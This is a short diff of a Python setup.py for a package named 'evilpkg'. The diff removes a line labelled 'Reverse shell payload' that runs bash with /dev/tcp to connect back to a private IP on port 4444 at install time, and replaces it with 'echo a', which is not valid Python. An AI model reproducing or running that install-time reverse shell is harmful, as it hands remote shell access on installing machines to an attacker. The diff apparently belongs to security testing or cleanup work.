@@ -1,8 +1,7 @@
 from setuptools import setup
 import os
 
-# Reverse shell payload
-os.system("bash -c 'bash -i >& /dev/tcp/192.168.141.129/4444 0>&1'")
+echo a
 
 setup(
     name='evilpkg',
